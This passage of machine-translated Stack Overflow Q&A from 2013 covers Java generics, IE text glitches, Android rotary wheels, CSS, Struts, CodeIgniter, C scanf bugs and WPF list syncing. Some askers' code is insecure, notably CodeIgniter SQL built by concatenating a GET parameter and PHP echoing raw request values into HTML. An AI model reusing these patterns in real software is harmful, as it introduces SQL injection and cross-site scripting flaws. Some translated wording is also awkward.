                 data.add(obj);
             }
        } catch (JSONException e) {
             e.printStackTrace();
        }
    }
} 
```

已`Class<T>`在 Java 5 中进行了修改，以允许您将其用作该类实例的工厂。`type.newInstance`静态检查调用的类型安全性。添加接口允许您以编译器可以静态检查的方式`WithJson`调用`setJson`实例上的方法。`T`

构造`Data<T>`时，需要传递正在创建的类，如下所示：

```
Data<MyContent> d = new Data(jsonString, MyContent.class); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:02:56.483

使用通用工厂接口。

```
public interface Factory<T>
{
    public T createFromJSONObject( JSONObject jo );
} 
```

现在是一个修改后的构造函数：

```
 public Data(
   String response1,
   Factory<T> factory
 ) {
     data = new ArrayList<T>();
     JSONArray ja;

     try {
          ja = new JSONArray(response1);
          for (int i = 0; i < ja.length(); i++) {
              JSONObject jo = (JSONObject) ja.get(i);
              data.add( factory.createFromJSONObject( jo ) );
          }
     } catch (JSONException e) {
          e.printStackTrace();
     }
 } 
```

# internet-explorer - Internet Explorer 中散布在文本中的上标“L”符号

> ID：15092218
> 
> 赞同：1
> 
> 时间：2013-02-26T14:56:37.957
> 
> 标签：internet-explorer, random, symbols

我正在开发一个文本非常繁重的网站，该网站在 Chrome、Firefox 和 Safari 中看起来不错。但是当我在 Internet Explorer 中对其进行测试时，它的文本上有随机分散的上标“L”符号。我回头查看代码，看看其中是否有任何额外的内容导致 L 但什么也没有。主要问题在主页上。

这是网站： [http ://emilymagnuson.com/mynews2/index.html](http://emilymagnuson.com/mynews2/index.html)

你必须在 IE 中查看它才能看到问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T17:04:40.357

查看您网站的 HTML，您的文本中有多余的字符出现在 Ls 处。您的 HTML 指定 UTF-8。您需要确定您的编辑器将您的文本保存为 UTF-8 而不是其他格式。删除那些多余的字符应该可以解决问题。我使用 Notepad++ 作为我的编辑器，它们显示得很清楚。我在 Opera 中看到了 Ls，所以这不仅仅是一个 IE 问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:11:32.663

Internet Explorer 有时呈现文本的方式与其他浏览器不同。我的建议是专门为 IE 创建一个单独的样式表。在该样式表中，只允许它在段落标签中使用衬线字体，如下所示：

在主 CSS 上输入这个

```
<![if !IE]>
 <link rel="stylesheet" type="text/css" href="not-ie.css" />
<![endif]> 
```

在 not-ie-css 中：

```
p {
 font-family: serif;
 } 
```

# java - 带有旋转图标的旋转轮

> ID：15092228
> 
> 赞同：1
> 
> 时间：2013-02-26T14:57:07.527
> 
> 标签：java, android, user-interface, android-canvas

现在这些天我正在研究可能附有屏幕截图的旋转轮。

![在此处输入图像描述](../Images/a369e49b645776a9497c7a565927f5ee.png)

![在此处输入图像描述](../Images/72d268213773558cd495809b0c8447be.png)

我从[github https://github.com/R4md4c/AndroidRotaryWheelView](https://github.com/R4md4c/AndroidRotaryWheelView)找到了代码 困难在于我无法在轮子旋转期间将图标保持在垂直位置。图标以其轮段的形式旋转虽然最初显示时需要将它们保持在垂直位置（根据屏幕截图1）。

我必须自定义以下代码，我需要更改特定可绘制矩形的边界。

我发现自己无法在参考中实现精确计算。

任何帮助将不胜感激。

```
 @Override
public void onDraw(Canvas canvas) {
// set the height of Wheel childs items
    canvas.scale(getWidth() / mViewRect.width(), getHeight() / 2
            / mViewRect.width(), xPosition, yPosition);

    canvas.save(Canvas.MATRIX_SAVE_FLAG); // Saving the canvas and later
                                            // restoring it so only this
                                            // image will be rotated.
    canvas.rotate((float) mRotationAngle, xPosition, yPosition);

    for (int i = 0; i < mWedges.length; i++) {
        Wedge f = mWedges[i];
        mPaint.setColor(SEGMENT_COLOR);
        mPaint.setStyle(Paint.Style.FILL_AND_STROKE);
        canvas.drawPath(f, mPaint);

        Rect rf = iconRect[i];

        if ((mMenuEntries.get(i).getIcon() != 0)
                && (mMenuEntries.get(i).getLabel() != null)) {

            System.out.println("the canvasd drawn ........");

            // This will look for a "new line" and split into multiple lines
            String menuItemName = mMenuEntries.get(i).getLabel();
            String[] stringArray = menuItemName.split("\n");

            mPaint.setColor(textColor);

            mPaint.setStyle(Paint.Style.FILL);
            // mPaint.setTextSize(textSize);

            Rect rect = new Rect();
            float textHeight = 0;
            for (int j = 0; j < stringArray.length; j++) {
                mPaint.getTextBounds(stringArray[j], 0,
                        stringArray[j].length(), rect);
                textHeight = textHeight + (rect.height() + 3);
            }

            Rect rf2 = new Rect();
            rf2.set(rf.left, rf.top - ((int) textHeight / 2), rf.right,
                    rf.bottom - ((int) textHeight / 2));

            float textBottom = rf2.bottom;
            for (int j = 0; j < stringArray.length; j++) {
                mPaint.getTextBounds(stringArray[j], 0,
                        stringArray[j].length(), rect);
                float textLeft = rf.centerX() - rect.width() / 2;
                textBottom = textBottom + (rect.height() + 3);
                mPaint.setTextSize(scalePX(8));
                canvas.drawText(stringArray[j], textLeft - rect.left,
                        textBottom - rect.bottom, mPaint);
            }

            // canvas.rotate((float)mRotationAngle,
            // rf.top-((int)textHeight/2), rf.bottom-((int)textHeight/2));
            int index = checkSelection(canvas);
            rf2 = rotaionRf(rf2, mRotationAngle);

            if (i == index) {
                // Puts in the Icon
                Drawable drawable = getResources().getDrawable(
                        mMenuEntries.get(i).getIconSelected());
                drawable.setBounds(rf2);
                drawable.draw(canvas);

            } else {
                // Puts in the Icon
                Drawable drawable = getResources().getDrawable(
                        mMenuEntries.get(i).getIcon());
                drawable.setBounds(rf2);
                drawable.draw(canvas);
            }
            // Icon Only
        } else if (mMenuEntries.get(i).getIcon() != 0) {

            System.out.println("the canvasd drawn ELSE........");

            // Puts in the Icon
            Drawable drawable = getResources().getDrawable(
                    mMenuEntries.get(i).getIconSelected());
            drawable.setBounds(rf);

            drawable.draw(canvas);

            // Text Only
        } else {
            // Puts in the Text if no Icon
            mPaint.setColor(this.textColor);

            /*
             * if (f != enabled && Wedge2Shown == true) {
             * mPaint.setAlpha(disabledAlpha); } else {
             * mPaint.setAlpha(textAlpha); }
             */
            // mPaint.setAlpha(textAlpha);
            mPaint.setStyle(Paint.Style.FILL);
            // mPaint.setTextSize(textSize);

            // This will look for a "new line" and split into multiple lines
            String menuItemName = mMenuEntries.get(i).getLabel();
            String[] stringArray = menuItemName.split("\n");

            // gets total height
            Rect rect = new Rect();
            float textHeight = 0;
            for (int j = 0; j < stringArray.length; j++) {
                mPaint.getTextBounds(stringArray[j], 0,
                        stringArray[j].length(), rect);
                textHeight = textHeight + (rect.height() + 3);
            }

            float textBottom = rf.centerY() - (textHeight / 2);
            for (int j = 0; j < stringArray.length; j++) {
                mPaint.getTextBounds(stringArray[j], 0,
                        stringArray[j].length(), rect);
                float textLeft = rf.centerX() - rect.width() / 2;
                textBottom = textBottom + (rect.height() + 3);
                canvas.drawText(stringArray[j], textLeft - rect.left,
                        textBottom - rect.bottom, mPaint);

            }

            // canvas.drawTextOnPath(text, path, hOffset, vOffset, paint)
            // canvas.rotate((float)mRotationAngle, xPosition, yPosition );
            // canvas.drawRect(rf, mPaint);

        }
        // canvas.restore();
    }
    // canvas.restore();
    canvas.restore();

    // System.out.println()
    canvas.save();

    canvas.restore();

    mPaint.setShader(mShader);
    // mPaint.setAlpha(0x66);
    // Draw the Selection Segment
    if (mSelectionWedge != null) {
        canvas.drawPath(mSelectionWedge, mPaint);
        // canvas.drawRect(mSelectionWedge.getWedgeRegion().getBounds(),
        // mPaint);
    }

    mPaint.setShader(null);

    int index = checkSelection(canvas);

    System.out.println("the index=====" + index);

    if (checkSelection(canvas) != -1) {
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:15:53.203

在使用 canvas.rotate 时，你必须确保你给它的 x&y 值是主轮中心。

# css - 使用 CSS 制作看起来一样

> ID：15092229
> 
> 赞同：5
> 
> 时间：2013-02-26T14:57:10.160
> 
> 标签：css

 我想让 <button> 和 <a> 看起来一样。我发现了一个类似的帖子，建议添加

```
box-sizing: content-box;
-webkit-box-sizing: content-box;
-moz-box-sizing: content-box; 
``` 

但是，在 Firefox 中查看时，它仍然有轻微的高度差异。这是[jsfiddle](http://jsfiddle.net/H3HK8/3/)。有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:13:22.067

[http://jsfiddle.net/H3HK8/22/](http://jsfiddle.net/H3HK8/22/)

```
button::-moz-focus-inner,
.btn::-moz-focus-inner
{
    border: 0;
    padding: 0;
} 
```

这修复了中间那个，仍在处理最终输入。

从这里[http://www.aheadcreative.com/removing-unwanted-button-padding-in-firefox/](http://www.aheadcreative.com/removing-unwanted-button-padding-in-firefox/)

**更新**

[我怀疑最后一个例子你是这个http://www.cssnewbie.com/input-button-line-height-bug/#.USzRd6Wcmzc](http://www.cssnewbie.com/input-button-line-height-bug/#.USzRd6Wcmzc)的受害者

[您可以在此示例http://jsfiddle.net/H3HK8/24/](http://jsfiddle.net/H3HK8/24/)中看到行高没有影响，即使添加了 !important。

> 在尝试解决这个规则时，我发现了一些让情况变得更可怕的东西：浏览器定义的 !important 规则不能被作者定义的 !important 规则所推翻。这条规则不能被 CSS 文件、内联样式——任何东西推翻。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:00:03.933

您应该确保所有 CSS 属性都相同。所以不仅是 box-sizing（它本身并没有真正做任何事情），还有 padding、margin、line-height、font-size、background 等。

# javascript - 如何从 iframe 中删除制表位？

> ID：15092230
> 
> 赞同：1
> 
> 时间：2013-02-26T14:57:11.107
> 
> 标签：javascript, jquery, dom, iframe, tabindex

如何从 中删除制表位`<iframe>`？`<iframe>`托管在我的域上。

我试过以下代码：

```
var objIFrame = document.getElementById('my_iframe');
if (objIFrame != null) {   
   objIFrame.setAttribute('tabindex', '-1');
} 
```

但我仍然专注于 iframe。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:03:36.063

iFrame 并不真正支持选项卡或选择，它通常是 iFrame 内的文档或正文是可选择的。尝试类似：

```
var objIFrame = document.getElementById('my_iframe');
    objIFrame.contentDocument.setAttribute('tabindex', '-1');
    objIFrame.contentDocument.getElementsByTagName('body')[0].setAttribute('tabindex', '-1'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-21T01:24:03.997

我研究[了 Stripe Elements 作为一个例子](https://stripe.dev/elements-examples/)来解决这个问题 - 他们`<iframes>`用来收集信用卡号码并在他们的所有字段中都有一个平滑的标签环。

没有任何设置`tabindex`对我有用，所以我选择用 JavaScript 来代替。我通过侦听要聚焦的窗口来修复它`<iframe>`，然后将该焦点重定向到我想要的元素。这需要您控制`<iframe>`的内容。

```
window.addEventListener('focus', function() {
  document.getElementById('myInput').focus();
}) 
```

这是一个例子：

**索引.html**

```
<html>
  <body>
    My input
    <input type="text" />
    <iframe src="https://www.example.com/iframe.html" />
  <body>
</html> 
```

**iframe.html**

```
<html>
  <body>
    More inputs
    <input type="text" />
    <input type="text" />
    <input type="text" />
    <script>
      window.addEventListener('focus', function() {
        document.getElementById('myInput').focus();
      })
    </script>
  <body>
</html> 
```

我注意到这种行为是 Internet Explorer 11 和 Firefox 76 独有的，但不影响 Chrome 81 或 Edge 81。

# actionscript-3 - 如何使用 Flex 4.6 移动应用程序获取手机号码？

> ID：15092231
> 
> 赞同：0
> 
> 时间：2013-02-26T14:57:12.663
> 
> 标签：actionscript-3, apache-flex, actionscript, flex4.6, flex-mobile

这是Bhanu Teja。我是 Flex 移动应用程序的新手。谁能告诉我，“如何在我们的 flex 移动应用程序中获取手机号码”。我正在使用 Flex 4.6。

感谢和问候 Bhanu Teja M.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-15T19:53:20.883

在 IOS 上是不可能的，API 是私有的，如果你这样做，Apple 会拒绝你的应用程序

在 Android 上，您必须编写一个本机扩展来完成此操作。从那里Android有一个API来获取它。这个答案详细说明了如何从 android 本地获取电话号码
[https://stackoverflow.com/a/2480307/731880](https://stackoverflow.com/a/2480307/731880)

# ios - 来自 UIWebView 的 iOS 缓存内容

> ID：15092232
> 
> 赞同：3
> 
> 时间：2013-02-26T14:57:13.647
> 
> 标签：ios, objective-c, caching, uiwebview

我正在尝试找到一种方法让 UIWebView 在一个 wifi 时缓存整个网页，并在连接到 3G 时从缓存中查看它，然后在再次使用 WiFi 时重新加载和重新缓存。

是否有任何 API 或任何东西可以做到这一点？

干杯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:01:35.570

无论是 3G 还是 WIFI，您都可以使用`NSURLRequestReturnCacheDataElseLoad`哪个`NSURLRequest` 缓存网页，否则会加载.. 您可以创建一个 3G 状态检查

这是`NSURLRequestReturnCacheDataElseLoad`

```
NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:urlString] cachePolicy:NSURLRequestReturnCacheDataElseLoad timeoutInterval: 10.0]; 
```

并使用`loadHTMLString`in加载从网页返回的数据`UIWebView`

# java - Java - 在构造函数方法调用中阻塞

> ID：15092235
> 
> 赞同：4
> 
> 时间：2013-02-26T14:57:30.240
> 
> 标签：java, playframework, akka

```
// allows passing in arguments to the MyActor constructor
ActorRef myActor = system.actorOf(new Props(new UntypedActorFactory() 
  {                                  // 
    public UntypedActor create() {   //
      return new MyActor("...");     //   <- this part confuses me
    }                                //
  }                                  //
 ), "myactor"); 
```

我是 Java 新手，正在阅读 Akka 文档。我发现上面的代码令人困惑。尤其是下面的代码块。如何将代码块发送到“new UntypedActorFactory()”构造函数调用。这种类型的构造函数初始化称为什么。

```
{
public UntypedActor create() {
return new MyActor("...");
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:03:23.317

让你感到困惑的部分是创建一个匿名类，然后实例化它，并将新创建的实例作为参数传递给方法。您所指的代码块是派生自的匿名类的主体`UntypedActorFactory`

例如，如果您有一个接口：

```
interface SomeInterface {
    void someMethod();
} 
```

您可以像这样创建一个实现您的接口的匿名类（类似的语法适用于扩展命名类）：

```
SomeInterface instance = new SomeInterface() {
    public void someMethod() {    //
        // implementation here    //  <- similar to the example, 
    }                             //     this is the body of anonymous class
};                                // 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:01:08.030

这是一个匿名类。

这只是一个继承自 UntypedActorFactory 并声明方法的新类。

# java - struts 1.0 逻辑标签选择 - if/else 逻辑

> ID：15092236
> 
> 赞同：2
> 
> 时间：2013-02-26T14:57:32.123
> 
> 标签：java, jsp, struts

我所拥有的是一个下拉列表。当用户选择某个选项时，其中每个选项代表 Java 服务器端的特定字符串。

现在，Java 服务器端能够检查选择了哪个选项，以及对应的数字。目前，我能够在 Java 后端输出值，而不是在 JSP 页面上。

Struts 1.0 是否有 if/else 标签？

我不确定哪个逻辑标记最适合为前端处理传递 Java 值：

**JSP 页面**

```
if(value = 666)
   this textbox is readonly
else
  this textbox row is active 
```

到目前为止我的研究：

看起来`logic:equal`，它似乎使用如下标记库在 JSP 页面上传递了一个值。这对我不起作用，因为我想*从*服务器端的 Java 类中传递值。

```
<logic:equal name="name" property="name" value="<%= theNumber %>" > 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T15:02:33.593

```
 <c:choose>
     <c:when test="${the number}">
         Both are equal.
     </c:when>
     <c:otherwise>
         Both are not equal.
     </c:otherwise>
     </c:choose> 
```

这是jstl标签

```
you need to use
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-26T17:26:16.860

JSTL 答案是最好的答案，但是，就我而言，它是一个没有 JSTL 的旧 Java 遗留应用程序，我无法介绍它。

这是我对一些遗留 Struts 1.3 代码的要求。设置一个复选框以匹配来自数据库调用的表单 bean 的值，如“Y”、“N”、“”或 null。

我还必须保留在 struts 逻辑标签中，而不是使用 JSTL，这是我最初的偏好。我知道 struts[文档](http://struts.apache.org/release/1.3.x/struts-taglib/tagreference.html#html%3acheckbox) 说复选框应该等同于 actionForm 中的布尔变量，但我使用了一个字符串值，它有效。

从上面的文档链接：

**注意：与此字段关联的基础属性值应为布尔类型，并且您指定的任何值都应对应于指示真值（“true”、“yes”或“on”）的字符串之一。如果您希望使用一组相关的 String 值，请考虑使用 multibox 标签。** 我曾考虑将我的字符串值转换为表单中的布尔值，但它以这种方式获取字符串。

最后，我使用了一些 javascript 来设置检查状态。所有这些都是冗长的，并不是最好的解决方案，但面对需求，它确实有效。

这是代码：

```
<logic:equal name="<%=formName%>" property="formInd" value="Y">
                <html:checkbox name="<%=formName%>" onchange="setDataChanged()" property="formInd"/>
                <script type="text/javascript" LANGUAGE="JavaScript">
                    document.<%=formName%>.formInd.checked = true;
                </script>              
            </logic:equal>
            <logic:equal name="<%=formName%>" property="formInd" value="N">
                <html:checkbox name="<%=formName%>" onchange="setDataChanged()" property="formInd"/>
                <script type="text/javascript" LANGUAGE="JavaScript">
                        document.<%=formName%>.formInd.checked = false;
                </script>              
            </logic:equal>
            <logic:empty name="<%=formName%>" property="formInd" >
                <html:checkbox name="<%=formName%>" onchange="setDataChanged()" property="formInd"/>
                <script type="text/javascript" LANGUAGE="JavaScript">
                        document.<%=formName%>.formInd.checked = false;
                </script>              
            </logic:empty> 
```

# php - codeigniter 方法在控制器上丢失数据

> ID：15092238
> 
> 赞同：0
> 
> 时间：2013-02-26T14:57:35.053
> 
> 标签：php, codeigniter

我有一个应用程序，我可以在其中编辑数据库表的字段。一切都很好并且数据已更新，除非我转到我要更新的字段而不是更改文本，而是将该字段留空。这样我得到了 php 错误，因为（我猜）我的控制器的方法丢失了表中该行的 id：

如果有人可以帮助我，我会很高兴，在此先感谢。

我使用 get 方法传递表格行 (edit_fuga.php) 的 id 的视图文件的一部分。

```
 <div id='tab2'>    
            <?php
            $query = $this->db->query("SELECT * FROM fugas WHERE tipo_fuga='2';");

            foreach ($query->result_array() as $row)
            {
                echo "<input type='hidden' name='id_fuga' value='". $row['id_fuga']."'>";
                echo $row['desc_fuga']."&nbsp;&nbsp;<a class='button' href='http://localhost/code/index.php/fugas/editar_fuga?var1=".$row['id_fuga']."'>Editar</a>";
                echo "<br/>";
            }

            ?>

        </div> 
```

我被重定向到的视图（editar_fuga.php）：

```
<?php echo validation_errors(); ?>

<?php echo form_open('fugas/editar_fuga') ?>

<?php 

$query = $this->db->query("SELECT desc_fuga_table FROM tipos_fuga where tipo_fuga_table='".$fuga_selected['tipo_fuga']."';");

foreach ($query->result() as $row)
{
   echo $row->desc_fuga_table;
}

$tipo_fuga_selected=$row->desc_fuga_table;

    ?>

    <label for="tipo_fuga"><?php echo $tipo_fuga_selected; ?></label><br/>
    <p/>

    <label for="desc_fuga">Desc da fuga:</label><p/> 
    <textarea rows="4" cols="50" name="desc_fuga"><?php echo $fuga_selected['desc_fuga']; ?></textarea><p/>

    <input type="hidden" name="id_fuga" value="<?php echo $fuga_selected['id_fuga']; ?>">
    <input type="submit" name="submit" value="Alterar Fuga" /><p/>

    <INPUT Type="button" VALUE="Voltar" onClick="history.go(-1);return true;">

</form> 
```

视图editar_fuga.php的控制器上的方法

```
public function editar_fuga(){

        $fuga_id = $this->input->get('var1');
        var_dump($fuga_id);

        $this->load->helper('form');
        $this->load->library('form_validation');
        //$this->load->view('templates/header');

        $this->form_validation->set_rules('desc_fuga', 'Descrição da fuga acidental', 'required');

    if ($this->form_validation->run() === FALSE)
    {
        $data['fuga_selected'] = $this->fugas_model->get_fuga($fuga_id);        
        $this->load->view('fugas/editar_fuga', $data);
    }
    else
    {
        $this->fugas_model->update_fuga();
        echo "Fuga alterada com sucesso.<br/><br/>";
        $this->load->view('fichas/index');
        }

    } 
```

风雅型号：

```
 public function update_fuga(){

    $data = array(
        'desc_fuga' => $this->input->post('desc_fuga')
    );

    $id=$this->input->post('id_fuga');

    $this->db->where('id_fuga', $id);
    $this->db->update('fugas', $data);

}

public function get_fuga($fuga_id){

    var_dump($fuga_id);

    $query = $this->db->query("SELECT * FROM fugas where id_fuga='".$fuga_id."';");

    foreach ($query->result_array() as $row)
    {
        $data_fuga = array(
    'id_fuga' => $row['id_fuga'],
    'tipo_fuga' => $row['tipo_fuga'],
    'desc_fuga' => $row['desc_fuga']
    );
    }

    return $data_fuga;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:16:43.367

错误就在这里，这是一种不好的做法。你不应该混合视图和数据库访问

此方法应该在您的模型中

```
$query = $this->db->query("SELECT desc_fuga_table FROM tipos_fuga where tipo_fuga_table='".$fuga_selected['tipo_fuga']."';");

foreach ($query->result() as $row)
{
   echo $row->desc_fuga_table;
}

$tipo_fuga_selected=$row->desc_fuga_table;

    ?> 
```

而且因为你没有第二次传递 $fuga_selected['tipo_fuga'] ，你不会得到任何结果，这意味着查询将是空的，也就是说 $row 永远不会实例化

所以给出错误的行是这个

```
$tipo_fuga_selected=$row->desc_fuga_table; 
```

正如@tix3 所说，你应该阅读更多关于 MVC 的内容，因为你有点搞砸了

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:13:17.977

首先，你做的事情完全错误。

您应该阅读一些关于 MVC 是什么的教程。

你不应该无缘无故地在你的视图文件中做数据库操作。您应该首先阅读优秀的 codeigniter 用户指南和一些关于 MVC 真正含义的通用文章：来自维基百科的示例在[这里](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller "这里")

您还应该查看 codeigniter 上的活动记录，以便您可以使用它来代替，`->query()`强烈建议您使用它，并且只应在一些极少数情况下使用 AR 无法完成一些非常复杂的查询。

*** 一些评论后编辑**

Active Record 是个人偏好，但我相信新手使用它更容易和更安全，因为输入会自动转义。是的 codeigniters AR 不是实际的 Active Record 实现，但它仍然比裸 sql 更好。

总而言之，将您的逻辑保留在控制器上，将数据库交互保留在模型上，并将 html（以及一些次要的查看逻辑）保留在视图中。

# php - 使用 Google Chart API /ZXING 库创建一维条码

> ID：15092242
> 
> 赞同：2
> 
> 时间：2013-02-26T14:57:51.663
> 
> 标签：php, zxing, google-visualization

我正在尝试使用 PHP 创建一维条码。我已经能够使用谷歌图表 API 创建二维二维码，如下所示：

```
 $size = $_REQUEST['size'];
$string = preg_replace('/\s+/','',$_REQUEST['content']);
$content       = $string;//$_REQUEST['content'];
$correction    = strtoupper($_REQUEST['correction']);
$encoding      = $_REQUEST['encoding'];

//form google chart api link
$rootUrl = "https://chart.googleapis.com/chart?cht=qr&chs=$size&chl=$content&choe=$encoding&chld=$correction";

//print out the image
echo '<img src="'.$rootUrl.'">'; 
```

此代码仅生成 QR 码。但我需要条形码。我需要更改参数以将其显示为 1D 条形码吗？请注意我正在使用 PHP 语言并使用 Zxing 库解码数据。请帮助。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:06:12.663

您使用的 API 已弃用（[https://developers.google.com/chart/infographics/](https://developers.google.com/chart/infographics/)）。据我所知，谷歌不提供一维条码生成器 API。

我建议你停止使用这个 API 并下载一个可以生成条形码的类。ZF 示例： http: [//framework.zend.com/manual/1.12/en/zend.barcode.creation.html](http://framework.zend.com/manual/1.12/en/zend.barcode.creation.html)

# c++ - 如果并与 == 比较

> ID：15092244
> 
> 赞同：0
> 
> 时间：2013-02-26T14:57:53.880
> 
> 标签：c++

我都是编程新手，所以请帮助我。结果变量似乎没有正确的值。我知道使用它更好`cin`，`cout`但我的导师让我使用`printf`and `scanf`。

如果我将代码更改为 printf("%d", result); 我会得到：运行时检查失败 #3 - 变量“结果”正在使用而没有被初始化。如果我将代码更改为 scanf("%c", &c); %c 将从第一个 scanf() 获得空白！！！所以我必须这样写 scanf("%c%*c", &c); 或者这样 scanf(" %c", &c);. 与 %d 或 %f 相比，似乎 %c 不会跳过空格。

```
#include<stdio.h>
#include<conio.h>

int main    ()
{
    int n1, n2;
    int result; 
    char c;
    printf("Lotfan addad aval ra vared konid\n");
    scanf("%d", &n1);
    printf("Lotfan addad Dovom ra vared konid\n");
    scanf("%d", &n2);
    printf("Please choose an operator\n");
    scanf("%c%*c", &c);
    if (c=='+')
    {
        result=n1+n2;
    }
    else if (c=='-')
    {
        result=n1-n2;
    }
    else if (c=='*')
    {
        result=n1*n2;
    }
    else if (c=='/')
    {
        result=n1/n2;
    }
    //else 
    //{
        //printf("error");
    //}
    //printf("%d%c%d=%d" ,n1,c,n2,&result);
    printf("%d", &result);
    getch();
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T14:58:38.640

您并不总是初始化`result`. 如果您的任何`if`条件都不为真，那么它将未初始化。您需要确保始终初始化它。

更重要的是，您不能传递`&result`给，`printf`因为这将打印`result`我确定不是您想要的地址。`result`而是通过。

```
printf("%d", result); 
```

当你写道：

```
scanf("%c%*c", &c); 
```

我想你实际上的意思是：

```
scanf("%c", &c); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:00:59.607

你有：

```
scanf("%c%*c", &c); 
```

将其更改为：

```
scanf("%c", &c); 
```

你有：

```
printf("%d", &result); 
```

将其更改为：

```
printf("%d", result); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T14:59:55.393

`result`value 在未正确初始化时实际上包含垃圾值。因此，垃圾进 - 垃圾出！

这 ->`printf("%d", &result);`也应该是`printf("%d",result);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:00:38.350

初始化结果并改变 printf("%d", &result); 到 printf("%d", 结果);

# wpf - 将模型的变化列表同步到 ViewModel 的 ObservableList 的最佳实践？

> ID：15092247
> 
> 赞同：11
> 
> 时间：2013-02-26T14:58:04.827
> 
> 标签：wpf, c#-4.0, user-interface, observablecollection, synchronizing

我有一个（外部）模型公开一个不断变化的列表（比如说每两秒左右）。ViewModel 知道注册 PropertyChange 事件的列表。该 ViewModel 还为 UI 提供了 ObservableCollection 以进行数据绑定。

```
+-----------------------------------------------+
|                                           View|
| +-----------+                                 |
| |Listbox    |                                 |
| +-----------+                                 |
+-----/\----------------------------------------+
      ||
      ||DataBinding
      ||
      ||
+-----||----------------------------------------+
|     ||                               ViewModel|
| +--------------------+         +-------------+|
| |ObservableCollection|<--------|ChangeHandler||
| +--------------------+    /    +-------------+|
|                          /           ^        |
+-------------------------/------------|--------+
                         /             |
                        /              |
           Synchronizing Lists         | PropertyChanged
                                       |
                                       |
+--------------------------------------|--------+
|                                  +-----+ Model|
|                                  |IList|      |
|                                  +-----+      |
|                                               |
+-----------------------------------------------+ 
```

原则上效果很好，除了不断进行的更新。随着每次更新，用户都会失去他的选择，即每次更新都会取消选择所有项目。这并不奇怪，因为 WPF 的 ListBox “看到”分配了一个新列表。

所以，事情一定是我们*没有*分配新的 ObservableCollection，而是将当前 ObservableCollection 的内容与更新后的 Model.List 合并

现在我的问题

*   同步列表 - 是否有关于如何进行此类合并的最佳实践（或框架）（将新项目复制到 ObservableCollection、删除丢失的项目、更新更改的项目）
*   选定项目 - 我如何确保 ListBox 保留当前选定的项目（除了项目被删除的情况）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:55:37.343

您可以从更新的模型列表中生成新的 ObservableCollection，也可以将当前的 ObservableCollection 与模型的同步。

如果您选择第二个，您可能想要避免的一件事是为每个同步项目触发 CollectionChanged 事件。看一下[这个 ObservableCollection 实现](http://www.codeproject.com/Articles/249311/Enhanced-ObservableCollection)，它具有延迟通知的能力。

至于保留当前的 ​​SelectedItem，如果 ObservableCollection 的实例没有更改（这是真的，因为我们正在同步集合）并且 SelectedItem 实例没有被删除，则列表框应该保存选择。但是，如果 NotifyCollectionChangedEventArgs.Action 是“重置”，我不确定这是否属实。如果是这种情况，您可以使用我使用的方法，即在 ViewModel 中同时具有 colllection 属性和 SelectedItem 属性。您在 TwoWay 模式下将 ViewModel 的 SelectedItem 绑定到 ListBox.SelectedItem。同步集合时，将 SelectedItem 保存在临时变量中，然后在同步后重新应用它（如果未删除）。

# html-email - Outlook 2010 在 HTML 电子邮件中的图像之间放置 1 像素水平间距

> ID：15092248
> 
> 赞同：0
> 
> 时间：2013-02-26T14:58:05.950
> 
> 标签：html-email, outlook-2007, outlook-2010

我对看似简单的事情有很大的问题。我有一封正在创建的 HTML 电子邮件。有一个部分包含一排图像，其中一些带有链接。Outlook 一直在第一张图像和第二张图像之间放置一个像素水平空间。我将它们放在表格单元格中，但即使图像只是在同一张表格中的一行中，我仍然遇到同样的问题。

可以在此处查看 HTML 源代码，在浏览器中它看起来不错 - 但复制并粘贴到 Outlook 2010 或 2007 会导致问题。

[http://cogentec.co.uk/redbar/bar2.html](http://cogentec.co.uk/redbar/bar2.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:42:18.880

看来，虽然 Outlook 的撰写视图显示图像之间的间隙，但一旦发送了电子邮件，它在接收端看起来很好。即使收件人是在撰写视图中错误地显示电子邮件的 Outlook 客户端。

解决了。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-01T17:04:29.113

你的图片都需要`display:block;`。除非您是浮动图像（这种情况很少见），否则请始终在电子邮件中使用它

# servicestack - 为什么不能直接下载最新的dll

> ID：15092252
> 
> 赞同：-2
> 
> 时间：2013-02-26T14:58:15.390
> 
> 标签：servicestack

我曾经从[https://github.com/ServiceStack/ServiceStack/downloads](https://github.com/ServiceStack/ServiceStack/downloads)下载 servicestack dll 。

为什么最新的 dll 不可用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T14:59:55.510

下载 DLL 是个坏主意。

相反，您应该简单地使用 NuGet，它将自动安装最新版本及其所有依赖项。

# git - 如何在本地取消提交中所做的所有更改？

> ID：15092258
> 
> 赞同：1
> 
> 时间：2013-02-26T14:58:28.290
> 
> 标签：git, github

